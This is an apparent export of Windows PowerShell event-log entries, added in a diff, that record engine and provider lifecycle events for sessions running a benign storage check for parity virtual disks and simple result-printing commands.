+Information,9/19/2025 1:06:26 PM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=62c20e4a-5efd-4cda-ae1b-285bc77afb20
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=5.1.17763.2931
+	RunspaceId=d68334a2-af49-425a-9a01-c90b54ef2ce8
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/19/2025 1:06:26 PM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=62c20e4a-5efd-4cda-ae1b-285bc77afb20
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/19/2025 1:06:26 PM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=62c20e4a-5efd-4cda-ae1b-285bc77afb20
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/19/2025 1:06:26 PM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=62c20e4a-5efd-4cda-ae1b-285bc77afb20
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/19/2025 1:06:26 PM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=62c20e4a-5efd-4cda-ae1b-285bc77afb20
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/19/2025 1:06:26 PM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=62c20e4a-5efd-4cda-ae1b-285bc77afb20
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/19/2025 1:06:26 PM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=62c20e4a-5efd-4cda-ae1b-285bc77afb20
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/19/2025 1:06:26 PM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=15
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=078c27ef-1bb9-4dee-873d-3fb291028535
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=5.1.17763.2931
+	RunspaceId=8f22e859-c49d-481c-92d5-790cfe8208c8
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/19/2025 1:06:25 PM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=078c27ef-1bb9-4dee-873d-3fb291028535
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=5.1.17763.2931
+	RunspaceId=8f22e859-c49d-481c-92d5-790cfe8208c8
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/19/2025 1:06:25 PM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=078c27ef-1bb9-4dee-873d-3fb291028535
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/19/2025 1:06:25 PM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=078c27ef-1bb9-4dee-873d-3fb291028535
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/19/2025 1:06:25 PM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=078c27ef-1bb9-4dee-873d-3fb291028535
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/19/2025 1:06:25 PM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=078c27ef-1bb9-4dee-873d-3fb291028535
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/19/2025 1:06:25 PM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=078c27ef-1bb9-4dee-873d-3fb291028535
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/19/2025 1:06:25 PM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=078c27ef-1bb9-4dee-873d-3fb291028535
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/19/2025 12:43:56 PM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e3d65eb2-b5c0-4344-8969-d391ecaa7b5d
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=5.1.17763.2931
+	RunspaceId=8bb46da5-3047-4365-b06d-c71d979eb9c2
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/19/2025 12:43:56 PM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e3d65eb2-b5c0-4344-8969-d391ecaa7b5d
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/19/2025 12:43:56 PM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e3d65eb2-b5c0-4344-8969-d391ecaa7b5d
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/19/2025 12:43:56 PM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e3d65eb2-b5c0-4344-8969-d391ecaa7b5d
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/19/2025 12:43:56 PM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e3d65eb2-b5c0-4344-8969-d391ecaa7b5d
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/19/2025 12:43:56 PM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e3d65eb2-b5c0-4344-8969-d391ecaa7b5d
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/19/2025 12:43:56 PM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e3d65eb2-b5c0-4344-8969-d391ecaa7b5d
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/15/2025 8:53:07 PM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=15
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=c919cbe3-b8a2-437a-9ffd-cb1bf7ae364a
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=5.1.17763.2931
+	RunspaceId=743b7e86-c203-43ea-a4b9-ba9da598ecf0
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/15/2025 8:53:02 PM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=c919cbe3-b8a2-437a-9ffd-cb1bf7ae364a
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=5.1.17763.2931
+	RunspaceId=743b7e86-c203-43ea-a4b9-ba9da598ecf0
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/15/2025 8:53:02 PM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=c919cbe3-b8a2-437a-9ffd-cb1bf7ae364a
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/15/2025 8:53:02 PM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=c919cbe3-b8a2-437a-9ffd-cb1bf7ae364a
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/15/2025 8:53:02 PM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=c919cbe3-b8a2-437a-9ffd-cb1bf7ae364a
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/15/2025 8:53:02 PM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=c919cbe3-b8a2-437a-9ffd-cb1bf7ae364a
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/15/2025 8:53:02 PM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=c919cbe3-b8a2-437a-9ffd-cb1bf7ae364a
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/15/2025 8:53:02 PM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=c919cbe3-b8a2-437a-9ffd-cb1bf7ae364a
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/15/2025 8:53:02 PM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=15
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=8a9b4957-0c95-4a90-ac9e-3f439896f150
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=5.1.17763.2931
+	RunspaceId=bf3c8f31-10a8-4d95-88a7-1de7f68921a0
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/15/2025 8:53:02 PM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=8a9b4957-0c95-4a90-ac9e-3f439896f150
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=5.1.17763.2931
+	RunspaceId=bf3c8f31-10a8-4d95-88a7-1de7f68921a0
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/15/2025 8:53:02 PM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=8a9b4957-0c95-4a90-ac9e-3f439896f150
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/15/2025 8:53:02 PM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=8a9b4957-0c95-4a90-ac9e-3f439896f150
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/15/2025 8:53:02 PM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=8a9b4957-0c95-4a90-ac9e-3f439896f150
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/15/2025 8:53:02 PM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=8a9b4957-0c95-4a90-ac9e-3f439896f150
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/15/2025 8:53:02 PM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=8a9b4957-0c95-4a90-ac9e-3f439896f150
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/15/2025 8:53:02 PM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=8a9b4957-0c95-4a90-ac9e-3f439896f150
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/15/2025 8:32:20 PM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=a39a5d64-43b6-4f25-8d9a-66a64a2dbe11
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=5.1.17763.2931
+	RunspaceId=4c7a89ba-830c-4026-bfb0-5a0840c7a57b
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/15/2025 8:32:20 PM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=a39a5d64-43b6-4f25-8d9a-66a64a2dbe11
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/15/2025 8:32:20 PM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=a39a5d64-43b6-4f25-8d9a-66a64a2dbe11
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/15/2025 8:32:20 PM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=a39a5d64-43b6-4f25-8d9a-66a64a2dbe11
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/15/2025 8:32:20 PM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=a39a5d64-43b6-4f25-8d9a-66a64a2dbe11
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/15/2025 8:32:20 PM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=a39a5d64-43b6-4f25-8d9a-66a64a2dbe11
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/15/2025 8:32:20 PM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=a39a5d64-43b6-4f25-8d9a-66a64a2dbe11
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
